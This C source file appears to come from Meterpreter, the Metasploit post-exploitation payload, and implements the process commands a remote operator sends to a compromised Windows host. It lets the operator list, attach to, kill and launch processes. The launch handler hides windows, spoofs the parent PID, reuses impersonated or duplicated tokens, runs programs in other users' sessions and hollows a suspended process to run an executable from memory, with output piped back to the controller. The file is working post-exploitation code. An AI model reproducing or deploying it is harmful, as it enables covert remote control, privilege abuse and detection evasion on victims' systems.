#include "precomp.h"
#include "common_metapi.h"
#include "ps.h" // include the code for listing proceses

#include "./../session.h"
#include "in-mem-exe.h" /* include skapetastic in-mem exe exec */

typedef BOOL (WINAPI *PEnumProcessModules)(HANDLE p, HMODULE *mod, DWORD cb, LPDWORD needed);
typedef DWORD (WINAPI *PGetModuleBaseName)(HANDLE p, HMODULE mod, LPWSTR base, DWORD baseSize);
typedef DWORD (WINAPI *PGetModuleFileNameEx)(HANDLE p, HMODULE mod, LPWSTR path, DWORD pathSize);

typedef BOOL (STDMETHODCALLTYPE FAR * LPFNCREATEENVIRONMENTBLOCK)( LPVOID  *lpEnvironment, HANDLE  hToken, BOOL bInherit );
typedef BOOL (STDMETHODCALLTYPE FAR * LPFNDESTROYENVIRONMENTBLOCK) ( LPVOID lpEnvironment );
typedef BOOL (WINAPI * LPCREATEPROCESSWITHTOKENW)( HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION );
typedef BOOL (WINAPI * UPDATEPROCTHREADATTRIBUTE) (
	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
	DWORD                        dwFlags,
	DWORD_PTR                    Attribute,
	PVOID                        lpValue,
	SIZE_T                       cbSize,
	PVOID                        lpPreviousValue,
	PSIZE_T                      lpReturnSize
);

typedef BOOL (WINAPI* INITIALIZEPROCTHREADATTRIBUTELIST) (
	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
	DWORD                        dwAttributeCount,
	DWORD                        dwFlags,
	PSIZE_T                      lpSize
);

const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

/*
 * Attaches to the supplied process identifier.  If no process identifier is
 * supplied, the handle for the current process is returned to the requestor.
 *
 * req: TLV_TYPE_PID - The process to attach to.
 */
DWORD request_sys_process_attach(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE handle = NULL;
	DWORD result = ERROR_SUCCESS;
	DWORD pid;

	// Get the process identifier that we're attaching to, if any.
	pid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PID);
	dprintf("[attach]: pid %d", pid);
	// No pid? Use current.
	if (!pid)
		handle = GetCurrentProcess();
	// Otherwise, attach.
	else
	{
		BOOLEAN inherit = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_INHERIT);
		DWORD permission = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_PERMS);

		handle = OpenProcess(permission, inherit, pid);
		dprintf("[attach] OpenProcess: opened process %d with permission %d: 0x%p [%d]\n", pid, permission, handle, GetLastError());
	}

	// If we have a handle, add it to the response
	if (handle)
		met_api->packet.add_tlv_qword(response, TLV_TYPE_HANDLE, (QWORD)handle);
	else
		result = GetLastError();

	// Send the response packet to the requestor
	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Closes a handle that was opened via the attach method
 *
 * req: TLV_TYPE_HANDLE - The process handle to close.
 */
DWORD request_sys_process_close(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE handle;
	DWORD result = ERROR_SUCCESS;
	handle = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_HANDLE);


	if (handle)
	{
		if (handle != GetCurrentProcess())
			CloseHandle(handle);
	}
	else
		result = ERROR_INVALID_PARAMETER;

	// Send the response packet to the requestor
	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Executes a process using the supplied parameters, optionally creating a
 * channel through which output is filtered.
 *
 * req: TLV_TYPE_PROCESS_PATH      - The executable to launch
 * req: TLV_TYPE_PROCESS_ARGUMENTS - The arguments to pass
 * req: TLV_TYPE_FLAGS             - The flags to execute with
 */
DWORD request_sys_process_execute(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Tlv inMemoryData;
	BOOL doInMemory = FALSE;
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
	LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
	HANDLE in[2], out[2];
	PCHAR path, arguments, commandLine = NULL;
	wchar_t *commandLine_w = NULL;
	PCHAR cpDesktop = NULL;
	wchar_t *cpDesktop_w = NULL;
	DWORD flags = 0, createFlags = 0, ppid = 0;
	BOOL inherit = FALSE;
	HANDLE token, pToken;
	DWORD session = 0;
	LPVOID pEnvironment = NULL;
	LPFNCREATEENVIRONMENTBLOCK  lpfnCreateEnvironmentBlock  = NULL;
	LPFNDESTROYENVIRONMENTBLOCK lpfnDestroyEnvironmentBlock = NULL;
	HMODULE hUserEnvLib = NULL;
	ProcessChannelContext * ctx = NULL;

	dprintf( "[PROCESS] request_sys_process_execute" );

	// Initialize the startup information
	memset( &pi, 0, sizeof(PROCESS_INFORMATION) );
	memset( &si, 0, sizeof(STARTUPINFOW) );
	si.cb = sizeof(STARTUPINFOW);
	lpAttributeList = NULL;

	// Initialize pipe handles
	in[0]  = NULL;
	in[1]  = NULL;
	out[0] = NULL;
	out[1] = NULL;

	do
	{
		// No response? We suck.
		if (!response)
		{
			break;
		}

		// Get the execution arguments
		arguments = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_PROCESS_ARGUMENTS);
		path = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_PROCESS_PATH);
		flags = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_FLAGS);
		ppid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PARENT_PID);

		if (met_api->packet.get_tlv(packet, TLV_TYPE_VALUE_DATA, &inMemoryData) == ERROR_SUCCESS)
		{
			doInMemory = TRUE;
			createFlags |= CREATE_SUSPENDED;
		}

		if (flags & PROCESS_EXECUTE_FLAG_DESKTOP)
		{
			cpDesktop = (char *)malloc(512);
			if (!cpDesktop) 
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}
			memset(cpDesktop, 0, 512);
			met_api->lock.acquire(remote->lock);

			_snprintf(cpDesktop, 512, "%s\\%s", remote->curr_station_name, remote->curr_desktop_name);

			met_api->lock.release(remote->lock);

			if (!(cpDesktop_w = met_api->string.utf8_to_wchar(cpDesktop)))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}
			si.lpDesktop = cpDesktop_w;
		}

		// If the remote endpoint provided arguments, combine them with the
		// executable to produce a command line
		if (path && arguments)
		{
			size_t commandLineLength = strlen(path) + strlen(arguments) + 2;

			if (!(commandLine = (PCHAR)malloc(commandLineLength)))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			_snprintf(commandLine, commandLineLength, "%s %s", path, arguments);
		}
		else if (path)
		{
			commandLine = path;
		}
		else
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}
		if (!(commandLine_w = met_api->string.utf8_to_wchar(commandLine)))
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// If the channelized flag is set, create a pipe for stdin/stdout/stderr
		// such that input can be directed to and from the remote endpoint
		if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED)
		{
			SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
			PoolChannelOps chops;
			Channel *newChannel;

			// Allocate the channel context
			if (!(ctx = (ProcessChannelContext *)malloc(sizeof(ProcessChannelContext))))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			memset(&chops, 0, sizeof(PoolChannelOps));

			// Initialize the channel operations
			dprintf("[PROCESS] context address 0x%p", ctx);
			chops.native.context = ctx;
			chops.native.write = process_channel_write;
			chops.native.close = process_channel_close;
			chops.native.interact = process_channel_interact;
			chops.read = process_channel_read;

			// Allocate the pool channel
			if (!(newChannel = met_api->channel.create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chops)))
			{
				result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}

			// Set the channel's type to process
			met_api->channel.set_type(newChannel, "process");

			// Allocate the stdin and stdout pipes
			if ((!CreatePipe(&in[0], &in[1], &sa, 0)) || (!CreatePipe(&out[0], &out[1], &sa, 0)))
			{
				met_api->channel.destroy(newChannel, NULL);

				newChannel = NULL;

				free(ctx);

				result = GetLastError();
				break;
			}

			// Initialize the startup info to use the pipe handles
			si.dwFlags |= STARTF_USESTDHANDLES;
			si.hStdInput = in[0];
			si.hStdOutput = out[1];
			si.hStdError = out[1];
			inherit = TRUE;
			createFlags |= CREATE_NEW_CONSOLE;

			// Set the context to have the write side of stdin and the read side
			// of stdout
			ctx->pStdin = in[1];
			ctx->pStdout = out[0];

			// Add the channel identifier to the response packet
			met_api->packet.add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, met_api->channel.get_id(newChannel));
		}

		// If the hidden flag is set, create the process hidden
		if (flags & PROCESS_EXECUTE_FLAG_HIDDEN)
		{
			si.dwFlags |= STARTF_USESHOWWINDOW;
			si.wShowWindow = SW_HIDE;
			createFlags |= CREATE_NO_WINDOW;
		}

		// Should we create the process suspended?
		if (flags & PROCESS_EXECUTE_FLAG_SUSPENDED)
			createFlags |= CREATE_SUSPENDED;

		// Set Parent PID if provided
		if (ppid) {
			dprintf("[execute] PPID spoofing\n");
			HMODULE hKernel32Lib = LoadLibrary("kernel32.dll");
			INITIALIZEPROCTHREADATTRIBUTELIST InitializeProcThreadAttributeList = (INITIALIZEPROCTHREADATTRIBUTELIST)GetProcAddress(hKernel32Lib, "InitializeProcThreadAttributeList");
			UPDATEPROCTHREADATTRIBUTE UpdateProcThreadAttribute = (UPDATEPROCTHREADATTRIBUTE)GetProcAddress(hKernel32Lib, "UpdateProcThreadAttribute");
			BOOLEAN inherit = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_INHERIT);
			DWORD permission = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_PERMS);
			HANDLE handle = OpenProcess(permission, inherit, ppid);
			dprintf("[execute] OpenProcess: opened process %d with permission %d: 0x%p [%d]\n", ppid, permission, handle, GetLastError());
			if (
				handle &&
				hKernel32Lib &&
				InitializeProcThreadAttributeList &&
				UpdateProcThreadAttribute
			) {
				size_t len = 0;
				InitializeProcThreadAttributeList(NULL, 1, 0, &len);
				lpAttributeList = malloc(len);
				if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &len)) {
					printf("[execute] InitializeProcThreadAttributeList: [%d]\n", GetLastError());
					result = GetLastError();
					break;
				}

				dprintf("[execute] InitializeProcThreadAttributeList\n");

				if (!UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &handle, sizeof(HANDLE), 0, 0)) {
					printf("[execute] UpdateProcThreadAttribute: [%d]\n", GetLastError());
					result = GetLastError();
					break;
				}

				dprintf("[execute] UpdateProcThreadAttribute\n");

				createFlags |= EXTENDED_STARTUPINFO_PRESENT;

				FreeLibrary(hKernel32Lib);
			}
			else {
				result = GetLastError();
				break;
			}
		}

		if (flags & PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN)
		{
			// If there is an impersonated token stored, use that one first, otherwise
			// try to grab the current thread token, then the process token
			if (remote->thread_token)
			{
				token = remote->thread_token;
				dprintf("[execute] using thread impersonation token");
			}
			else if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &token))
			{
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token);
			}

			dprintf("[execute] token is 0x%.8x", token);

			// Duplicate to make primary token (try delegation first)
			if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken))
			{
				if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &pToken))
				{
					result = GetLastError();
					dprintf("[execute] failed to duplicate token 0x%.8x", result);
					break;
				}
			}

			hUserEnvLib = LoadLibrary("userenv.dll");
			if (NULL != hUserEnvLib)
			{
				lpfnCreateEnvironmentBlock = (LPFNCREATEENVIRONMENTBLOCK)GetProcAddress(hUserEnvLib, "CreateEnvironmentBlock");
				lpfnDestroyEnvironmentBlock = (LPFNDESTROYENVIRONMENTBLOCK)GetProcAddress(hUserEnvLib, "DestroyEnvironmentBlock");
				if (lpfnCreateEnvironmentBlock && lpfnCreateEnvironmentBlock(&pEnvironment, pToken, FALSE))
				{
					createFlags |= CREATE_UNICODE_ENVIRONMENT;
					dprintf("[execute] created a duplicated environment block");
				}
				else
				{
					pEnvironment = NULL;
				}
			}

			// Try to execute the process with duplicated token
			if (!CreateProcessAsUserW(pToken, NULL, commandLine_w, NULL, NULL, inherit, createFlags, pEnvironment, NULL, &si, &pi))
			{
				LPCREATEPROCESSWITHTOKENW pCreateProcessWithTokenW = NULL;
				HANDLE hAdvapi32 = NULL;
				result = GetLastError();

				// sf: If we hit an ERROR_PRIVILEGE_NOT_HELD failure we can fall back to CreateProcessWithTokenW but this is only
				// available on 2003/Vista/2008/7. CreateProcessAsUser() seems to be just borked on some systems IMHO.
				if (result == ERROR_PRIVILEGE_NOT_HELD)
				{
					do
					{
						hAdvapi32 = LoadLibrary("advapi32.dll");
						if (!hAdvapi32)
						{
							break;
						}
						pCreateProcessWithTokenW = (LPCREATEPROCESSWITHTOKENW)GetProcAddress(hAdvapi32, "CreateProcessWithTokenW");
						if (!pCreateProcessWithTokenW)
						{
							break;
						}
						if (!pCreateProcessWithTokenW(pToken, LOGON_NETCREDENTIALS_ONLY, NULL, commandLine_w, createFlags, pEnvironment, NULL, &si, &pi))
						{
							result = GetLastError();
							dprintf("[execute] failed to create the new process via CreateProcessWithTokenW 0x%.8x", result);
							break;
						}

						result = ERROR_SUCCESS;

					} while (0);

					if (hAdvapi32)
					{
						FreeLibrary(hAdvapi32);
					}
				}
				else
				{
					dprintf("[execute] failed to create the new process via CreateProcessAsUser 0x%.8x", result);
					break;
				}
			}

			if (lpfnDestroyEnvironmentBlock && pEnvironment)
			{
				lpfnDestroyEnvironmentBlock(pEnvironment);
			}

			if (NULL != hUserEnvLib)
			{
				FreeLibrary(hUserEnvLib);
			}
		}
		else if (flags & PROCESS_EXECUTE_FLAG_SESSION)
		{
			typedef BOOL(WINAPI * WTSQUERYUSERTOKEN)(ULONG SessionId, PHANDLE phToken);
			WTSQUERYUSERTOKEN pWTSQueryUserToken = NULL;
			HANDLE hToken = NULL;
			HMODULE hWtsapi32 = NULL;
			BOOL bSuccess = FALSE;
			DWORD dwResult = ERROR_SUCCESS;

			do
			{
				// Note: wtsapi32!WTSQueryUserToken is not available on NT4 or 2000 so we dynamically resolve it.
				hWtsapi32 = LoadLibraryA("wtsapi32.dll");

				session = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PROCESS_SESSION);

				if (session_id(GetCurrentProcessId()) == session || !hWtsapi32)
				{
					if (!CreateProcessW(NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si, &pi))
					{
						BREAK_ON_ERROR("[PROCESS] execute in self session: CreateProcessW failed");
					}
				}
				else
				{
					pWTSQueryUserToken = (WTSQUERYUSERTOKEN)GetProcAddress(hWtsapi32, "WTSQueryUserToken");
					if (!pWTSQueryUserToken)
					{
						BREAK_ON_ERROR("[PROCESS] execute in session: GetProcAdress WTSQueryUserToken failed");
					}

					if (!pWTSQueryUserToken(session, &hToken))
					{
						BREAK_ON_ERROR("[PROCESS] execute in session: WTSQueryUserToken failed");
					}
					if (!CreateProcessAsUserW(hToken, NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si, &pi))
					{
						BREAK_ON_ERROR("[PROCESS] execute in session: CreateProcessAsUser failed");
					}
				}

			} while (0);

			if (hWtsapi32)
			{
				FreeLibrary(hWtsapi32);
			}

			if (hToken)
			{
				CloseHandle(hToken);
			}

			result = dwResult;

			if (result != ERROR_SUCCESS)
			{
				break;
			}
		}
		else
		{
			// Try to execute the process
			if (!CreateProcessW(NULL, commandLine_w, NULL, NULL, inherit, createFlags, NULL, NULL, &si, &pi))
			{
				result = GetLastError();
				break;
			}
		}

		//
		// Do up the in memory exe execution if the user requested it
		//
		if (doInMemory)
		{

			//
			// Unmap the dummy executable and map in the new executable into the
			// target process
			//
			if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, inMemoryData.buffer))
			{
				result = GetLastError();
				break;
			}

			//
			// Resume the thread and let it rock...
			//
			if (ResumeThread(pi.hThread) == (DWORD)-1)
			{
				result = GetLastError();
				break;
			}

		}

		// check for failure here otherwise we can get a case where we
		// failed but return a process id and this will throw off the ruby side.
		if (result == ERROR_SUCCESS)
		{
			// if we managed to successfully create a channelized process, we need to retain
			// a handle to it so that we can shut it down externally if required.
			if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED
				&& ctx != NULL)
			{
				dprintf("[PROCESS] started process 0x%x", pi.hProcess);
				ctx->pProcess = pi.hProcess;
			}

			// Add the process identifier to the response packet
			met_api->packet.add_tlv_uint(response, TLV_TYPE_PID, pi.dwProcessId);

			met_api->packet.add_tlv_qword(response, TLV_TYPE_PROCESS_HANDLE, (QWORD)pi.hProcess);

			CloseHandle(pi.hThread);
		}

	} while (0);

	// Close the read side of stdin and the write side of stdout
	if (in[0])
	{
		CloseHandle(in[0]);
	}
	if (out[1])
	{
		CloseHandle(out[1]);
	}

	// Free the command line if necessary
	if (path && arguments && commandLine)
	{
		free(commandLine);
	}

	if (commandLine_w) 
	{
		free(commandLine_w);
	}

	if (cpDesktop)
	{
		free(cpDesktop);
	}

	if (cpDesktop_w)
	{
		free(cpDesktop_w);
	}

	if (lpAttributeList)
	{
		free(lpAttributeList);
	}

	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Kills one or more supplied processes
 *
 * req: TLV_TYPE_PID [n]
 */
DWORD request_sys_process_kill(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Tlv pidTlv;
	DWORD index = 0;

	while ((met_api->packet.enum_tlv(packet, index++, TLV_TYPE_PID,
			&pidTlv) == ERROR_SUCCESS) &&
			(pidTlv.header.length >= sizeof(DWORD)))
	{
		DWORD pid = ntohl(*(LPDWORD)pidTlv.buffer);
		HANDLE h = NULL;

		// Try to attach to the process
		if (!(h = OpenProcess(PROCESS_TERMINATE, FALSE, pid)))
		{
			result = GetLastError();
			break;
		}

		if (!TerminateProcess(h, 0))
			result = GetLastError();

		CloseHandle(h);
	}

	// Transmit the response
	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Gets the list of active processes (including their PID, name, user, arch and path)
 * and sends the information back to the requestor. See ps.c for the guts of this.
 */
DWORD request_sys_process_get_processes( Remote * remote, Packet * packet )
{

	Packet * response = NULL;
	HANDLE hToken     = NULL;
	DWORD result      = ERROR_SUCCESS;

	do
	{
		response = met_api->packet.create_response( packet );
		if( !response )
			break;

		// If we can, get SeDebugPrivilege...
		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )
		{
			TOKEN_PRIVILEGES priv = {0};

			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
				AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

			CloseHandle( hToken );
		}

		// First we will try to get a process list via the toolhelp API. This method gives us the most information
		// on all processes, including processes we cant actually open and all x64/x86 processes on x64 systems.
		// However NT4 does not have the toolhelp API (but Win98 did!?!).
		result = ps_list_via_toolhelp( response );
		if( result != ERROR_SUCCESS )
		{
			// Second attempt is to use the PSAPI functions which may work on NT4 if the PSAPI patch has been applied.
			result = ps_list_via_psapi( response );
			if( result != ERROR_SUCCESS )
			{
				// Third method is to brute force the process list (and extract info from PEB) if all other methods have failed.
				result = ps_list_via_brute( response );
			}
		}

		met_api->packet.transmit_response( result, remote, response );

	} while( 0 );

	return result;
}

/*
 * Handles the getpid request
 */
DWORD request_sys_process_getpid(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	met_api->packet.add_tlv_uint(response, TLV_TYPE_PID, GetCurrentProcessId());

	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Returns information about the supplied process handle.
 *
 * req: TLV_TYPE_HANDLE - The handle to gather information from.
 */
DWORD request_sys_process_get_info(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);

	PEnumProcessModules enumProcessModules = NULL;
	PGetModuleBaseName getModuleBaseName = NULL;
	PGetModuleFileNameEx getModuleFileNameEx = NULL;

	HMODULE mod;
	HANDLE psapi = NULL;
	HANDLE handle;
	DWORD result = ERROR_SUCCESS;
	DWORD needed;
	wchar_t path[1024], name[512];

	handle = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_HANDLE);

	do
	{
		// Valid response?
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Valid parameters?
		if (!handle)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		// Open the process API
		if (!(psapi = LoadLibrary("psapi")))
		{
			result = GetLastError();
			break;
		}

		if (!(enumProcessModules = (PEnumProcessModules)GetProcAddress(psapi, "EnumProcessModules")))
		{
			result = GetLastError();
			break;
		}

		// Try to resolve the address of GetModuleBaseNameA
		if (!(getModuleBaseName = (PGetModuleBaseName)GetProcAddress(psapi, "GetModuleBaseNameW")))
		{
			result = GetLastError();
			break;
		}

		// Try to resolve the address of GetModuleFileNameExA
		if (!(getModuleFileNameEx = (PGetModuleFileNameEx)GetProcAddress(psapi, "GetModuleFileNameExW")))
		{
			result = GetLastError();
			break;
		}

		memset(name, 0, sizeof(name));
		memset(path, 0, sizeof(path));

		// Enumerate the first module in the process and get its base name
		if ((!enumProcessModules(handle, &mod, sizeof(mod), &needed) ||
			 (getModuleBaseName(handle, mod, name, sizeof(name) - 1) == 0)))
		{
			result = GetLastError();
			break;
		}

		// Try to get the process' file name
		getModuleFileNameEx(handle, mod, path, sizeof(path) - 1);

		// Set the process' information on the response
		met_api->packet.add_tlv_string(response, TLV_TYPE_PROCESS_NAME, met_api->string.wchar_to_utf8(name));
		met_api->packet.add_tlv_string(response, TLV_TYPE_PROCESS_PATH, met_api->string.wchar_to_utf8(path));

	} while (0);

	// Transmit the response
	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);

	// Close the psapi library and clean up
	if (psapi)
		FreeLibrary(psapi);

	return ERROR_SUCCESS;
}

/************************
 * Process DIO handlers *
 ************************/

/*
 * Reads directly from the output handle of the process
 *
 * FIXME: can-block
 */
DWORD process_channel_read(Channel *channel, Packet *request,
	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead)
{
	ProcessChannelContext *ctx = (ProcessChannelContext *)context;

	dprintf("[PROCESS] process_channel_read. channel=0x%08X, ctx=0x%08X", channel, ctx);

	if (ctx == NULL)
		return ERROR_SUCCESS;

	if (!ReadFile(ctx->pStdout, buffer, bufferSize, bytesRead, NULL))
		return GetLastError();

	return ERROR_SUCCESS;
}

/*
 * Writes data from the remote half of the channel to the process's standard
 * input handle
 */
DWORD process_channel_write(Channel* channel, Packet* request, LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten)
{
	ProcessChannelContext* ctx = (ProcessChannelContext*)context;
	DWORD result = ERROR_SUCCESS;

	dprintf("[PROCESS] process_channel_write. channel=0x%08X, ctx=0x%08X", channel, ctx);

	if (ctx == NULL)
	{
		return result;
	}

	if (!WriteFile(ctx->pStdin, buffer, bufferSize, bytesWritten, NULL))
	{
		result = GetLastError();
	}

	return result;
}

/*
 * Closes the channels that were opened to the process.
 */
DWORD process_channel_close( Channel *channel, Packet *request, LPVOID context )
{
	DWORD result = ERROR_SUCCESS;
	ProcessChannelContext *ctx = (ProcessChannelContext *)context;

	dprintf( "[PROCESS] process_channel_close. channel=0x%08X, ctx=0x%08X", channel, ctx );

	if (ctx == NULL)
	{
		return result;
	}
	if ( ctx->pProcess != NULL ) {
		dprintf( "[PROCESS] channel has an attached process, closing via scheduler signal. channel=0x%08X, ctx=0x%08X", channel, ctx );
		met_api->scheduler.signal_waitable( ctx->pStdout, SchedulerStop );
	} else {
		CloseHandle( ctx->pStdin );
		CloseHandle( ctx->pStdout );

		free( ctx );
	}
	return result;
}

DWORD process_channel_interact_destroy( HANDLE waitable, LPVOID entryContext, LPVOID threadContext )
{
	ProcessChannelContext *ctx = (ProcessChannelContext *)threadContext;
	DWORD dwResult = ERROR_SUCCESS;
	Channel *channel = (Channel *)entryContext;

	dprintf( "[PROCESS] terminating context 0x%p", ctx );

	if (ctx == NULL)
	{
		return dwResult;
	}

	CloseHandle( ctx->pStdin );
	CloseHandle( ctx->pStdout );

	if( ctx->pProcess ) {
		dprintf( "[PROCESS] terminating process 0x%x", ctx->pProcess );
		TerminateProcess( ctx->pProcess, 0 );
	}

	free( ctx );
	if (met_api->channel.exists(channel))
	{
		channel->ops.pool.native.context = NULL;
	}

	return dwResult;
}

/*
 * Callback for when data is available on the standard output handle of
 * a process channel that is interactive mode
 */
DWORD process_channel_interact_notify(Remote* remote, LPVOID entryContext, LPVOID threadContext)
{
	dprintf("[PROCESS] process_channel_interact_notify: START");
	Channel* channel = (Channel*)entryContext;
	ProcessChannelContext* ctx = (ProcessChannelContext*)threadContext;
	DWORD bytesRead, bytesAvail = 0;
	CHAR buffer[16384];
	DWORD result = ERROR_SUCCESS;

	if (!met_api->channel.exists(channel) || ctx == NULL)
	{
		dprintf("[PROCESS] process_channel_interact_notify: channel not here, or context is NULL");
		return result;
	}

	dprintf("[PROCESS] process_channel_interact_notify: looking for stuff on the stdout pipe");
	if (PeekNamedPipe(ctx->pStdout, NULL, 0, NULL, &bytesAvail, NULL))
	{
		dprintf("[PROCESS] process_channel_interact_notify: named pipe call returned, %u bytes", bytesAvail);
		if (bytesAvail)
		{
			dprintf("[PROCESS] process_channel_interact_notify: attempting to read %u bytes", bytesAvail);
			if (ReadFile(ctx->pStdout, buffer, sizeof(buffer) - 1, &bytesRead, NULL))
			{
				dprintf("[PROCESS] process_channel_interact_notify: read %u bytes, passing to channel write", bytesRead);
				return met_api->channel.write(channel, remote, NULL, 0, buffer, bytesRead, NULL);
			}
			result = GetLastError();
		}
		else
		{
			// sf: if no data is available on the pipe we sleep to avoid running a tight loop
			// in this thread, as anonymous pipes won't block for data to arrive.
			Sleep(100);
		}
	}
	else
	{
		result = GetLastError();
	}

	if (result != ERROR_SUCCESS)
	{
		dprintf("Closing down channel: result: %d\n", result);
		process_channel_close(channel, NULL, ctx);
		met_api->channel.close(channel, remote, NULL, 0, NULL);
	}

	dprintf("[PROCESS] process_channel_interact_notify: END");
	return result;
}

/*
 * Enables or disables interactivity with the standard output handle on the channel
 */
DWORD process_channel_interact(Channel* channel, Packet* request, LPVOID context, BOOLEAN interact)
{
	ProcessChannelContext* ctx = (ProcessChannelContext*)context;
	DWORD result = ERROR_SUCCESS;

	dprintf("[PROCESS] process_channel_interact. channel=0x%08X, ctx=0x%08X, interact=%d", channel, ctx, interact);

	if (!met_api->channel.exists(channel) || ctx == NULL)
	{
		dprintf("[PROCESS] process_channel_interact: Channel doesn't exist or context is NULL");
		return result;
	}

	// If the remote side wants to interact with us, schedule the stdout handle
	// as a waitable item
	if (interact)
	{
		// try to resume it first, if it's not there, we can create a new entry
		if ((result = met_api->scheduler.signal_waitable(ctx->pStdout, SchedulerResume)) == ERROR_NOT_FOUND)
		{
			result = met_api->scheduler.insert_waitable(ctx->pStdout, channel, context,
				(WaitableNotifyRoutine)process_channel_interact_notify,
				(WaitableDestroyRoutine)process_channel_interact_destroy);
		}
	}
	else
	{
		// Otherwise, pause it
		result = met_api->scheduler.signal_waitable(ctx->pStdout, SchedulerPause);
	}
	dprintf("[PROCESS] process_channel_interact: done");
	return result;
}

/*
 * Wait on a process handle until it terminates.
 *
 * req: TLV_TYPE_HANDLE - The process handle to wait on.
 */
DWORD request_sys_process_wait(Remote *remote, Packet *packet)
{
	Packet * response = met_api->packet.create_response( packet );
	HANDLE handle     = NULL;
	DWORD result      = ERROR_INVALID_PARAMETER;

	handle = (HANDLE)met_api->packet.get_tlv_value_qword( packet, TLV_TYPE_HANDLE );

	if( handle )
	{
		if( WaitForSingleObject( handle, INFINITE ) == WAIT_OBJECT_0 )
			result = ERROR_SUCCESS;
	}

	met_api->packet.transmit_response( result, remote, response );

	return result;
}
